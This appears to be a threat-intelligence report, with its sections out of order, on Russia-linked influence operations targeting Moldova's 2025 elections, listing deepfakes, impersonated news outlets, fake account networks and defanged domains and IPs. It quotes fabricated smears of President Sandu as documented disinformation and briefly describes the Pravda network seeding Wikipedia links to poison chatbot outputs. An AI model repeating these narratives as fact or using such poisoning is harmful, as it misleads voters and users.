#TikTokNews, #Trump2020, and #gaza. The posts’ associated captions, however, reflect an anti-EU perspective and are consistent with pro-Russian messaging targeting domestic audiences that seeks to erode trust in Western institutions and sow disillusionment with European alignment.</p>\n        <p>Compared to the curated TikTok accounts, the secondary network of social media accounts we identified on mainstream social media contained usernames incorporating Indian, Bangladeshi, and Sanskrit names and posted content in Romanian. Several of these accounts also held verified badges, indicating that their administrators had paid for premium features on the social media platform. After these accounts were suspended by the platform, replacement accounts with Western names, still posting in Romanian, took their place in late June 2025. Based on rolling platform suspensions and the emergence of new accounts, Insikt Group assesses that the administrators of Operation Undercut will likely continue attempting to establish a persistent presence on social media.</p>\n        <p>Although these accounts did not have a notable following, we observed the network persistently attempting to engage in <a href=\"https://disarmframework.herokuapp.com/technique/20/view\">hashtag hijacking</a> to increase the visibility of its posts to wider audiences. To do so, Operation Undercut almost certainly continues to engage in <a href=\"https://go.recordedfuture.com/hubfs/reports/TA-RU-2024-1126.pdf\">localized hashtag use</a> to identify and hijack trending hashtags among Romanian-speaking audiences in Moldova, very likely using commercial off-the-shelf social media monitoring tools. While the accounts do regularly achieve more than 100 views per post, we have not observed any meaningful engagement with broader audiences. However, viewership statistics of Operation Undercut activity on TikTok specifically indicate that the posts regularly receive thousands of views each; one <a href=\"https://archive.is/YJqhQ\">post</a> from Bella Popescu calling on President Sandu to resign garnered more than 113,000 views.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1167aa89dc3c17695a1161dc3da2bd9528573ef5b.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"725\" />\n            </div>\n          </div>\n          <div>\n            <div>\n              <p><strong><em>Figure 21</em></strong><em>: Four TikTok accounts Insikt Group attributes to Operation Undercut</em></p>\n              <p><em>(Source: TikTok [<a href=\"https://archive.ph/zrbY6\">archive one</a>,</em> <em><a href=\"https://archive.is/WGtiI\">archive two</a>,</em> <em><a href=\"https://archive.is/5kusC\">archive three</a>,</em> <em><a href=\"https://archive.is/CgrWP\">archive four</a>])</em></p>\n            </div>\n          </div>\n        </div>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1f3295acf7f570edcc242379924aae572ec0460c3.png?width=750&amp;format=png&amp;optimize=medium\" width=\"610\" height=\"375\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figures 22 and 23</em></strong><em>: Sample Operation Undercut-operated social media accounts, now suspended (Source: Social media)</em></div>\n          </div>\n        </div>\n        <p>Although the operation continues to fail in its attempts to significantly impact public opinion, it likely has improved its online engagement since our prior investigation through its expanded social media use on TikTok.

In all, WatchDog.MD identified this network as part of a larger network consisting of 2,167 auto-generated Facebook pages created to “influence political processes in the Republic of Moldova and other European states.” Many of these pages have randomly generated names, incorporating photos later found to have been stolen from Eastern European dating websites. WatchDog.MD attributed this activity to Russia-based actors.</p>\n        <h3>Narratives</h3>\n        <p>WatchDog.MD’s preliminary investigation determined that networks of anonymously operated Facebook pages running commercial advertisements and likely connected to Shor presented themselves as media or news pages with patriotic names similar to other Moldova-related pages Meta <a href=\"https://about.fb.com/news/2024/10/taking-action-against-coordinated-inauthentic-behavior-in-moldova/\">disclosed</a> in October 2024, such as “Authentic Moldova”, “Today’s Chișinău”, “Гагаузия вперед” (“Gagauzia Forward”), “Moldova вперед” (“Moldova Forward”), “My Dream Moldova”, “Orhei Today”, and others. Posts and paid ads praise Ilan Shor and Shor-managed organizations, such as “A New Life”, the “National Salvation Committee”, and the “Movement for the People”, while labelling PAS as corrupt or incompetent. WatchDog.MD indicated that between October 2022 and November 2024, Shor spent nearly 470,000 euros across over 1,400 Facebook advertisements, cautioning that the “actual amount may be even higher.”</p>\n        <h3>Infrastructure</h3>\n        <p>Automated infrastructure very likely powers the entirety of the miscellaneous pro-Shor Facebook Pages. WatchDog.MD traced 2,167 Facebook pages built from randomly concatenated keyword strings (“Gourmet Gurus Crafty Creations Motivational Moments”, “Travel Junkies Business Builders Neighborhood News”, or “WealthWave Innovations”), with dozens of clones sharing the exact same title. Profile photos are likely misappropriated from Eastern European dating and “cam sites,” and the same images frequently resurface across multiple page aliases. Early iterations of the network were openly administered from the Philippines, Vietnam, Timor-Leste, and the United Arab Emirates (UAE), with ads paid in USD or Polish zloty, indicators which WatchDog.MD used to attribute the network as operating outside Moldovan jurisdiction.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_14633218a2c5ce1535cdb62a2df72d55aee00eef8.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1504\" height=\"1376\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 24</em></strong><em>: Example placeholder “WealthWave Innovations” Facebook Pages; Insikt Group found that similar pages were sponsoring advertisements for Ilan Shor-backed Evrazia’s “Discover Russia 2025” program (Source: Facebook)</em></div>\n          </div>\n        </div>\n        <p>Insikt Group’s independent review found that in mid-May 2025, the majority of these Facebook Pages remained dormant, with little information from which to discern plans of potential future activity or planned purposes. We did find, however, that several of the previously mentioned WealthWave Innovations-named pages were advertising a “Discover Russia 2025” program, facilitated by the Shor-backed Russian NGO “Evrazia.” In October 2024, the Organized Crime and Corruption Reporting Project (OCCRP) <a href=\"https://www.occrp.org/en/feature/a-russian-non-profit-interferes-in-moldovas-eu-referendum-and-builds-an-anti-western-influence-machine\">concluded</a> that Evrazia was bribing Moldovan citizens to vote against the EU referendum. In all, OCCRP stated that $15 million USD in illegally transferred funds from Evrazia was used to attempt to bribe 130,000 voters to vote against the referendum, organized through Telegram. Shor reportedly argued he was engaging in legal activity, stating he was paying Moldovans “salaries” in return for their work in “explaining to people the advantages of the Eurasian economic space.”</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_17e481315842e8fa01cfed566e8ca2467941d678f.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"668\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 25</em></strong><em>: Now-inactive Facebook ads from mid-May 2025 from “WealthWave Innovations” advertising Shor-backed “Evrazia” and its “Discover Russia 2025” program (Source:</em> <em><a href=\"https://www.facebook.com/ads/library/?active_status=all&amp;ad_type=all&amp;country=ALL&amp;is_targeted_country=false&amp;media_type=all&amp;q=%22Wealthwave%20Innovations%22&amp;search_type=keyword_exact_phrase\">Facebook Ad Library</a>).</em></div>\n          </div>\n        </div>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1201b51c3d54f99654ec1c4f85bc99eb28f0f1f56.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1600\" height=\"899\" />\n            </div>\n          </div>\n          <div>\n            <div>\n              <p><strong><em>Figure 26</em></strong><em>: An “about us” page highlighting Evrazia’s “Discover Russia 2025” program</em></p>\n              <p><em>(Source: Evrazia[.]su [<a href=\"https://archive.is/4I8Bd\">archive</a>])</em></p>\n            </div>\n          </div>\n        </div>\n        <h2>Russian State Media Provides Infrastructure Support to Pro-Kremlin Moldova24</h2>\n        <p>Since February 2025, Insikt Group has tracked the growth of Moldova24 (MD24), a Russia-based and likely Kremlin-backed television network geared toward Russian-speaking individuals living in Moldova. MD24’s Russian connections and attempts to reshape opinion in Moldova were first detailed during the October 2024 election cycle when the Security and Intelligence Service of Moldova (SIS) ordered national internet service providers (ISPs) to <a href=\"https://www.orange.md/ro/noutate/site-uri-blocate-03-10-2024\">block</a> two of MD24’s primary news domains, <em>moldova24[.]online</em> and <em>pwa[.]moldova24[.]online</em>. Moldovan authorities later also <a href=\"https://balkaninsight.com/2024/10/11/moldova-takes-down-pro-kremlin-oligarch-shors-telegram-accounts/\">blocked</a> Telegram accounts belonging to Russian oligarch Shor, which included Telegram accounts associated with MD24.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1329a4f0b11d9354a9b451dbb324a07ed1af23cd8.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1562\" height=\"838\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 27</em></strong><em>: Moldover24’s home page featuring a 24/7 livestream of the network (Source: MD24 [<a href=\"https://archive.is/Qlym7\">archive</a>]).</em></div>\n          </div>\n        </div>\n        <h3>Narratives</h3>\n        <p>MD24 launched in September 2024 with the almost certain aim of influencing Moldovan public opinion among Russian speakers favorably toward pro-Russian policies and a closer diplomatic relationship with Moscow. MD24 news articles and its 24/7 broadcast platform, which are hosted on its core website, <em>moldova-24[.]online</em>, frequently criticize Western policies, highlight Moldova’s economic difficulties, and question the West's motives in deepening its ties with Moldova. MD24 news coverage often includes biased reporting, emotional language, and selective coverage, and very likely seeks to promote skepticism toward Western institutions, particularly the EU and the US.</p>\n        <p>An emerging theme emanating from MD24, consistent with shared narratives from pro-Kremlin sources, is to undermine public confidence in Moldova's electoral process and the credibility of PAS specifically. MD24 has <a href=\"https://archive.is/u5eid\">published</a> <a href=\"https://archive.is/sNTw0\">multiple</a> articles promoting skepticism, distrust, and suspicion regarding Moldova’s voting procedures with the diaspora vote, which accounted for <a href=\"https://www.eurasian-research.org/publication/westing-made-good-untangling-the-presidential-elections-in-moldova/\">one-fifth</a> of the total vote during the October 2024 election and leans heavily toward Sandu. MD24 has amplified allegations of intended or planned electoral fraud among diaspora voters, asserting a deliberate PAS strategy to artificially inflate votes from abroad. Simultaneously, MD24 <a href=\"https://archive.is/bvRdc\">claimed</a> PAS was intentionally discriminating against or otherwise suppressing pro-Russia Moldovan voters, specifically those residing in Russia and Transnistria. Domestically, MD24 <a href=\"https://archive.is/x1cAt\">published</a> articles suggesting PAS was intimidating opposition figures and, with help from the EU, sought to bribe the electorate in order to win votes.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1ed470ee59f6901690d53051dcd8dd0a2b312a3a8.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1108\" height=\"947\" />\n            </div>\n          </div>\n          <div>\n            <div>\n              <p><strong><em>Figure 28</em></strong><em>: MD24 articles published in mid-June 2025 suggesting plans of voter fraud emanating from foreign ballot stations</em></p>\n              <p><em>in support of PAS (Source: MD24 [<a href=\"https://archive.is/kc3Lr\">1</a>,</em> <em><a href=\"https://archive.is/7ZQHt\">2</a>,</em> <em><a href=\"https://archive.is/zIu8d\">3</a>]).</em></p>\n            </div>\n          </div>\n        </div>\n        <h3>Infrastructure and State-Sponsored Support</h3>\n        <p>Insikt Group assesses that Russia's state-sponsored media outlet RT has very likely supported the development of MD24 through covert means. This includes actively hosting its website and website mirrors through IP space that is not currently directly associated with RT or its parent organization, RIA Novosti, but is the same IP space that hosted RT content dating back more than five years, in addition to content created by RT personnel. Furthermore, it is likely that RT personnel supported the launch of MD24 and its ongoing operations through physical means, such as providing suitable studio space in Moscow, equipment, and possibly guidance on broadcast operations. MD24 is also likely under RT’s editorial influence, using minimal direct citations between the organizations to maintain a veneer of independence despite clear ties to shared infrastructure.</p>\n        <p>In February 2025, Insikt Group provided Recorded Future customers with a Threat Actor Profile of MD24 and its connections to Russian state media infrastructure, several months ahead of findings published by other research groups. Independent public <a href=\"https://dfrlab.org/2025/06/03/unveiling-the-russian-infrastructure-supporting-the-moldova24-tv-channel/?fbclid=IwY2xjawKr1v1leHRuA2FlbQIxMABicmlkETE5aFdhVWR6NEh4WEdxRGU5AR4vv1Q6fLhTXa276dD1xsyIS-d0GccBDQpJgMiXBK9_Ie1FY7iaz4Ck5CZFLQ_aem_IFgzrsCQk9LAVV4BI-hYUg\">reporting</a> from the Atlantic Council’s DFRLab in June 2025 corroborates our initial findings of MD24 as largely supported by the Russian government and pro-Kremlin actors. According to Insikt Group’s investigation, MD24 was available in more than a dozen domains initially hosted at the Russia-based IP address <em>91[.]218[.]228[.]51</em>, owned by AS210079, which is operated by Eurobyte LLC. This has since been updated to a different Eurobyte-owned IP address, <em>95[.]181[.]226[.]185</em>, as of July 2025.</p>\n        <div>\n          <div>\n            <div><strong>Domain</strong></div>\n            <div><strong>Create Date</strong></div>\n          </div>\n          <div>\n            <div>moldova24[.]space</div>\n            <div>2024-07-17</div>\n          </div>\n          <div>\n            <div>moldova24[.]press</div>\n            <div>2024-07-17</div>\n          </div>\n          <div>\n            <div>moldova-24[.]online</div>\n            <div>2024-07-17</div>\n          </div>\n          <div>\n            <div>moldova24[.]online</div>\n            <div>2024-07-17</div>\n          </div>\n          <div>\n            <div>moldova24[.]org</div>\n            <div>2024-07-17</div>\n          </div>\n          <div>\n            <div>moldova-24[.]live</div>\n            <div>2024-07-17</div>\n          </div>\n          <div>\n            <div>mldvideo24[.]space</div>\n            <div>2024-09-11</div>\n          </div>\n          <div>\n            <div>mldvideo24[.]tech</div>\n            <div>2024-09-11</div>\n          </div>\n          <div>\n            <div>mldvideo24[.]site</div>\n            <div>2024-09-11</div>\n          </div>\n          <div>\n            <div>mldvideo24[.]online</div>\n            <div>2024-09-11</div>\n          </div>\n          <div>\n            <div>mldvideo24[.]pro</div>\n            <div>2024-09-11</div>\n          </div>\n          <div>\n            <div>newseday[.]site</div>\n            <div>2024-10-08</div>\n          </div>\n          <div>\n            <div>premiumlive[.]site</div>\n            <div>2024-10-08</div>\n          </div>\n          <div>\n            <div>nlive-24[.]online</div>\n            <div>2024-10-08</div>\n          </div>\n          <div>\n            <div>nlive24[.]ru</div>\n            <div>2024-10-08</div>\n          </div>\n        </div>\n        <p><strong><em>Table 1</em></strong><em>: MD24-associated domains (Source: Recorded Future)</em></p>\n        <p>RT is very likely to have covertly supported the administration of these domains, based on historical registration data indicating shared infrastructure between MD24 and RT-affiliated websites.

The network also republishes official press releases and communications from Russian government ministries, local administrations, and other state institutions, and regularly republishes commentary from pro-Russian Telegram sources and pro-Kremlin “bloggers.”</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1db3e30dffe49f9cd300ca4f7d7840ba2dde2aab4.png?width=750&amp;format=png&amp;optimize=medium\" width=\"850\" height=\"601\" />\n            </div>\n          </div>\n          <div>\n            <div>\n              <p><strong><em>Figure 34</em></strong><em>: Most frequently cited sources for over 151,000 articles published on Pravda MD, md[.]news-pravda[.]com</em></p>\n              <p><em>(Source:</em> <em><a href=\"https://portal-kombat.com/\">Pravda Dashboard via CheckFirst</a>)</em></p>\n            </div>\n          </div>\n        </div>\n        <h3>Narratives</h3>\n        <p>Pravda MD very likely functions as a high-volume amplification node that launders Russian state media and other pro-Kremlin narratives to Romanian-speaking audiences in Moldova. The website and broader Portal Kombat sources do not produce original reporting, but rather republish content plagiarized from the above-mentioned, Russia-aligned sources. The content from these sources consistently questions President Sandu’s credibility, anti-corruption measures, and PAS’s broader political platform. Likewise, these sources erode support for EU integration and attempt to further drive social fragmentation while laying the groundwork to delegitimize Moldova’s September 2025 parliamentary elections should the Kremlin view the results as unfavorable.</p>\n        <p>Notably, Pravda MD, in line with Russia’s broader objectives, very likely seeks to exploit Moldova's internal ethnic and regional fault lines, particularly in the autonomous region of Gagauzia and the Russia-controlled breakaway region of Transnistria. Insikt Group further assesses that the underlying goal is to fuel separatism, undermine the authority of the central government in Chișinău, and create internal crises that Russia can leverage in pursuit of drawing Gagauzia and Transnistria closer into Russia’s geopolitical orbit. Further, <a href=\"https://ecfr.eu/publication/the-bear-behind-the-ballot-moldovas-election-in-the-shadow-of-war/#_edn13%20\">according</a> to the European Council on Foreign Relations (ECFR), citing a May 2025 interview with a high-ranking Moldovan government official, Pravda MD and the Pravda ecosystem at large were assessed as being used as a tool in Russian attempts to engage in the “online penetration of the [Moldovan diaspora].”</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_192a6c5c6bcaab0524d54679d18918e38f34f3ab6.png?width=750&amp;format=png&amp;optimize=medium\" width=\"848\" height=\"226\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 35</em></strong><em>: A July 2, 2025, Pravda MD article featuring Victory Bloc member Yuri Vitnyansky arguing that if “PAS wins the elections, Moldova will face a massive psychological fall and a new wave of migration” (Source: Pravda MD [<a href=\"https://archive.is/HTy0S\">archive</a>])</em></div>\n          </div>\n        </div>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1a3140362b966446e4a5ebf07a2f268564ce1bc1f.png?width=750&amp;format=png&amp;optimize=medium\" width=\"863\" height=\"431\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 36</em></strong><em>: A July 2, 2025, Pravda MD article originally published by Sputnik News Moldova, blaming PAS for Moldova’s “burdensome tax regime” (Source: Pravda MD [<a href=\"https://archive.is/X8WjZ\">archive</a>])</em></div>\n          </div>\n        </div>\n        <h3>Infrastructure</h3>\n        <p>The European External Action Service (EEAS), in its third Report on Foreign Information Manipulation and Interference Threats, <a href=\"https://www.eeas.europa.eu/eeas/3rd-eeas-report-foreign-information-manipulation-and-interference-threats-0_en\">highlighted</a> three Portal Kombat domains created to target both Russian and Romanian-speaking audiences in Moldova, <em>md[.]news-pravda[.]com</em>, <em>moldova[.]news-pravda[.]com</em>, and the now-defunct <em>pravda-md[.]com</em>.

It is possible that these page views are cumulative across all of Pravda’s localized webpages.</p>\n        <p>While the results of Pravda’s website viewership are mixed, there are broader concerns about the volume of content created by the network potentially poisoning secondary sources, particularly large-language models (LLMs) with access to the internet. Joint research by DFRLab and CheckFirst <a href=\"https://dfrlab.org/2025/03/12/pravda-network-wikipedia-llm-x/\">found</a> hyperlinks to Pravda-network domains on Wikipedia rose sharply after February 24, 2022, reaching 1,907 links on 1,672 pages in 44 languages; specific Moldova-related <a href=\"https://github.com/CheckFirstHQ/pravda-network-dissemination-data/blob/main/Wikipedia/results.csv\">content</a> at the time of the analysis was limited.

Insikt Group assesses that these operations are likely less intended to secure a clear pro-Russian majority than to decrease voter turnout, particularly among the diaspora vote, fracture the pro-European bloc, and cast doubt on the legitimacy of the result should such a result be unfavorable to Russia’s foreign policy objectives.

These resilience measures make a decisive electoral victory in favor of the Kremlin unlikely. Nevertheless, even in the wake of an election result perceived by the Kremlin as unfavorable, Russia may pivot toward more overt destabilization activities aligned with its broader Russkiy Mir objectives, such as inciting protest violence in Russian-speaking regions like Gagauzia and Transnistria, or exploiting regional instability to further consolidate territorial control consistent with its post-Soviet reunification ambitions.</p>\n        <h2>Appendix A: Key Infrastructure Observed</h2>\n        <h3>Operation Undercut Social Media Handles</h3>\n        <div>\n          <div>\n

observing multiple active Russia-linked influence operations (IOs) seeking to destabilize the elections and derail Moldova's European Union (EU) accession. As of this writing, the IOs analyzed in this report are unlikely to have achieved any substantial successes in shaping public opinion or guiding discourse around the upcoming elections.\nThe Russian IOs and corresponding networks analyzed in this report — Operation Overload, Operation Undercut, Foundation to Battle Injustice, Portal Kombat, and other Russian influence assets — are consistently projecting an unfavorable view of Moldovan President Maia Sandu and the ruling Party of Action and Solidarity (PAS) to almost certainly manipulate international and domestic public perceptions by framing Moldova’s sitting leadership as corrupt and counter to Moldova’s interests. Additionally, these operations are portraying Moldova’s further integration with the EU as disastrous for its economic future and sovereignty, and Moldova as a whole as at odds with European standards and values. Further, the content being amplified by these IOs suggests that Moldova is politically and economically more closely aligned with Russia than with the EU, and that a closer relationship with the Kremlin is a more favorable alternative.\nSince at least April 2025, Operation Overload (Matryoshka, Storm-1679) has almost certainly engaged in a vilification campaign against President Sandu, while also projecting Moldova as incompatible with the rest of Europe. Likewise, the Foundation to Battle Injustice has also published multiple inauthentic investigations with the key goal of damaging the credibility of President Sandu and PAS. During this timeframe, a Russia-linked IO we track as Operation Undercut has actively dedicated much of its resources to an anti-Sandu, anti-PAS, anti-European integration effort targeting Moldovan social media users, including activity we attribute to Operation Undercut on TikTok for the first time. This report also highlights recently reported covert Facebook pages associated with Moldovan oligarch Ilan Shor’s “Evrazia” organization, as well as the Shor-linked television network actively attempting to grow influence in the country, Moldova24. Finally, our research examines ongoing activities from Pravda Moldova, a pro-Russian media aggregator hyper-focused on Moldovan political affairs and part of the Portal Kombat ecosystem that was recently identified as engaging in poisoning the output of artificial intelligence chatbots.\nAs the September 2025 parliamentary elections approach, Insikt Group assesses that Russia-linked IOs, including both the well-documented networks discussed in this report and any newly emerging ones, will very likely scale up in volume. Despite limited evidence that these operations have meaningfully influenced voter behavior, they still pose broader risks to media integrity and public trust. Narratives undermining election security or integrity could reduce voter turnout, while media engagement with inauthentic content — rather than exposing the tactics behind it — may amplify malign messaging. To mitigate these risks, we recommend monitoring the sources identified in this report using the Recorded Future Intelligence Operations Platform to inform public messaging, bolstering election-related cyber defenses, and continuing to proactively expose malign IOs to reduce their potential impact.\nKey Findings\nMultiple Russia-linked IOs are actively attempting to destabilize Moldova’s September 2025 parliamentary elections and degrade public confidence in the current pro-Western Moldovan leadership.\nOperation Overload and the Russia-based non-governmental organization (NGO) Foundation to Battle Injustice are almost certainly engaging in separate campaigns to negatively shape international opinion toward Moldova’s European integration aspirations and to decrease public support of Moldovan President Maia Sandu.\nOperation Undercut is very likely attempting to condition Moldovan audiences to expect rigged elections in favor of PAS, exploit pre-existing fears of a conventional war with Russia, and amplify economic concerns for voters.\nIOs associated with Ilan Shor’s Evrazia organization and Moldova24, a very likely Shor-sponsored Russia-state-backed television network, are disseminating anti-Sandu messages targeting Moldovan audiences through social media advertising on Meta.\nThe very likely sole function of Pravda Moldova’s website is to serve as a high-volume amplifier and launderer of pro-Kremlin media content to Moldova’s Romanian-speaking population as part of Portal Kombat’s ecosystem.\nBackground\nMoldova’s September 2025 parliamentary elections are expected to decisively influence the country’s long-term future, especially the continued trajectory toward EU integration by its 2030 target date. This strategic direction was affirmed in late 2024, when Moldovan voters narrowly approved a constitutional referendum endorsing EU membership. This referendum coincided with the reelection of incumbent President Sandu, who secured approximately 55% of the vote. However, the 2024 election was subject to substantial attempted Russian interference, including systematic vote-buying, covert financial support for pro-Russian candidates, malign IOs, hybrid disruptions targeting electoral infrastructure, and physical interference via bomb threats aimed at diaspora polling stations. With the 2025 parliamentary elections effectively a “last-chance” to slow or entirely derail Moldova’s EU membership, Russian IOs and potential destabilization activities are likely to escalate.\nCovert IOs Seek to Bring Moldova Back into “Russian World”\nInsikt Group is actively tracking multiple Russia-linked IOs that target Russian- and Romanian-speaking audiences within Moldova, as well as broader international communities. These operations are almost certainly designed to delegitimize Moldova’s electoral integrity by promoting narratives alleging electoral fraud, inflaming tensions regarding diaspora voting, and discrediting the PAS. Additionally, the operations seek to weaken public support for Moldova's EU integration, exacerbate economic anxieties among Moldovan citizens, and exploit pre-existing ethnic and linguistic divisions.\nCollectively, these influence activities very likely align with the Kremlin’s strategic objectives toward Moldova, specifically advancing its post-Soviet reunification doctrine of Russkiy Mir (“Russian World”) and seeking to transform Moldova into a \"second Belarus.\" While initially an effort to promote Russian culture and language abroad, Russkiy Mir has since evolved into an expansionist vision of uniting Russian-speaking populations in former Soviet states regardless of internationally recognized territorial boundaries. As a former Soviet state and as a result of its significant Russian-speaking minority, Moldova remains susceptible to targeted IOs. In recent years, Russian IOs targeting Moldova have included efforts to provoke separatist sentiments in the autonomous region of Transnistria and coordinated attempts ranging from social media influence to bribery tactics to influence the outcome of Moldova’s 2024 presidential elections. Meanwhile, Russia’s attempts at economic coercion, namely through the disruption of gas supplies, sought to pressure Moldova into favorable political concessions, including likely attempts to slow its path toward European integration.\nOperation Overload and Foundation to Battle Injustice Vilify Maia Sandu\nRussia-linked IO Operation Overload (Matryoshka, Storm-1679) and the Russia-based “Foundation to Battle Injustice” (R-FBI, FBR) are almost certainly engaging in separate campaigns to shape negative opinion among international audiences toward Moldova’s European integration aspirations and to smear the reputation of Moldovan President Maia Sandu. Currently, Insikt Group assesses that both Operation Overload and R-FBI are operating in parallel ahead of the September 2025 parliamentary elections; however, we do not have evidence to suggest that Operation Overload or R-FBI are coordinating their efforts. Further, we have not observed attempts from either network to cross-amplify content.\nOperation Overload\nOperation Overload is a Russia-linked IO consisting of inauthentic news and fake fact-checking content that impersonates legitimate news sources. First documented by CheckFirst and Reset.Tech in June 2024, Operation Overload’s primary objective is to overwhelm journalists, researchers, and fact-checking organizations with non-credible leads distributed through persistent, spam-like story verification requests. As evidenced in Bellingcat founder Eliot Higgins’s recent post of Operation Overload-administered email accounts sharing falsified “egregious news” from Moldova to his inbox (Figure 1), journalists, researchers, and fact-checking organizations almost certainly remain a priority target audience for the operation. Insikt Group coverage of the operation ahead of the 2024 United States (US) election assessed that Operation Overload also sought to directly influence the general public, both through the inadvertent laundering of its claims through trusted media organizations that fact-check the operation’s content, and by directly injecting inauthentic media into the mainstream using Telegram and social media.\nFigure 1: Screenshot of a spam email sent to Bellingcat founder Eliot Higgins containing Operation Overload social media posts (Source: Bluesky)\nNarratives\nAutomated social media accounts engaging in coordinated inauthentic behavior (CIB) are almost certainly promoting Operation Overload content with a substantial emphasis on degrading the public reputation of President Sandu and public perceptions of Moldova with regard to European compatibility and EU integration. Since at least April 2025, inauthentic news and other media content we attribute to Operation Overload have almost certainly sought to damage President Sandu’s reputation. The operation regularly attempts to portray President Sandu as corrupt, featuring videos containing fabricated headlines and falsified investigative research that makes claims such as, “$79 million has been found on the cryptocurrency wallets of Maia Sandu’s aides,” and “Maia Sandu’s alleged mistress has $24 million in assets … that were corruptly obtained by Sandu [per fake Bellingcat research].” A video impersonating German broadcaster Deutsche Welle that Insikt Group documented in April 2025 falsely claimed that Veronica Dragalin, former head of Moldova’s Anti-Corruption Prosecutor’s Office, was preparing to distribute material implicating Sandu to “300 European media outlets.” Other inauthentic media pieces we attribute to Operation Overload sought to drive a wedge between or create the appearance of a growing political rivalry between President Sandu and EU High Representative Kaja Kallas, suggesting that President Sandu was seeking to take Kallas’s position.\nFigures 2 and 3: Operation Overload videos posted to social media in April 2025, impersonating the BBC and Deutsche Welle (Source: Recorded Future)\nFigure 4: Operation Overload video impersonating Deutsche Welle, suggesting a potential political rift between Kaja Kallas and Maia Sandu (Source: Social media)\nStarting July 8, 2025, Insikt Group observed a series of Operation Overload-produced deepfakes impersonating Moldovan government spokesperson Daniel Vodă, which are designed to appear as official government rebuttals of earlier “investigations” that the same network had fabricated. These deepfakes are almost certainly intended to create a closed-loop narrative undermining the Moldovan government while also attempting to lend false credibility to Operation Overload’s initial inauthentic media pieces. These videos, which repurpose authentic press material, add AI-generated audio, and weave in fabricated narratives, are very likely also intended to erode public trust in the Moldovan government ahead of the September 2025 parliamentary elections.\nFigure 5: Operation Overload deepfake of Moldovan government spokesperson Daniel Vodă, published July 9, 2025\n(Source: Social media and YouTube)\nBeyond videos, Operation Overload’s static influence content includes deceptively edited screenshots of social media posts, manipulated headlines of print media, and fabricated graphical imagery, such as photojournalist-documented political graffiti in public spaces. For example:\nOne post impersonating the statistics portal Statistica presented a falsified graph depicting President Sandu’s “plummeting approval rating” linked to increased TV appearances between January and April 2025.\nA separate post featured an edited Vogue magazine cover, falsely claiming that President Sandu had the sixth-most expensive presidential wardrobe.\nAnother series of images, designed to appear as photojournalist posts for French media, depicted superimposed graffiti in public spaces showing President Sandu beneath a guillotine, in an electric chair, and with her head in a noose, with the date of June 1, 2025, beside each image. While the date appeared arbitrary, it was very likely intended to manufacture public fear by implying the possibility of unrest, a coup, or an assassination attempt against President Sandu.\nFigures 6 and 7: Left: Operation Overload impersonation of Statistica; Right: Russian Telegram channel @shkvarka2 shares two inauthentic graffiti in Chișinău showing President Sandu being executed via hanging\n(Source: Social media and Telegram [archive])\nFigures 8 and 9: (Left) An Operation Overload impersonation of French news magazine La Tribune dated June 21, 2025; (Right) La Tribune’s legitimate June 21, 2025 front page (Source: Bluesky [archive, frontpages.com])\nBeyond character attacks on President Sandu, Operation Overload also attempts to portray Moldova as a central hub of European crime and diametrically opposed to Western values, very likely in an attempt to diminish its appeal to European audiences. For example, Operation Overload’s impersonations of Euronews and Agence France-Presse (AFP), shown in Figures 10–12, suggest that Moldova is “the largest hub for cybercriminals,” is “one of the largest logistics hubs for drug trafficking,” and is “the most homophobic country in Europe.” Similar non-credible storylines impersonating Western media remain ongoing and will very likely persist throughout Moldova’s election period.\nFigures 10, 11, and 12: Various Operation Overload impersonations of Euronews accusing Moldova of criminal and discriminatory activities (Source: Recorded Future)\nInfrastructure\nWe continue to observe Operation Overload-attributed media often appearing first in Russian Telegram channels, followed by CIB amplification exclusively on one social media platform, and attempted seeding on Bluesky. Mainstream social media promotion included automated resharing, liking, and amplification through “quoted replies” toward target groups (journalists, researchers, and fact-checkers), consistent with Operation Overload’s dissemination techniques throughout 2025. Beginning in late May 2025, we observed the network posting content to TikTok. The network’s social media accounts are often suspended; however, replacements soon take their place, necessitating constant efforts to detect and report new accounts.\nInsikt Group considers the overwhelming majority of Operation Overload content promoted within the network to fall in the Brookings Breakout Scale’s Category 2, including nearly all of the content specific to Moldova. There are isolated instances, however, where Operation Overload media impersonations garnered Category 3 consideration, and some have even reached what we would assess as Category 5 (amplification through celebrities and other well-known public figures).\nThe success Operation Overload achieves in reaching its target audience very likely emanates from the campaign’s secondary exposure from sources that debunk its non-credible stories versus organic reach from the initial posts. The corrective reports inadvertently push the operation’s artefacts out of echo chambers and into mainstream media. Even though the coverage is “hostile” to Operation Overload, this coverage nonetheless constitutes a Category 4, or cross-medium breakout, when analyzed via the Breakout Scale.\nFoundation to Battle Injustice (R-FBI)\nR-FBI is an ongoing Russia-based IO ostensibly dedicated to exposing alleged human rights violations and injustices committed primarily by Western governments. R-FBI poses as an “independent non-profit organization” in support of addressing “human rights violations”; the organization, however, leverages 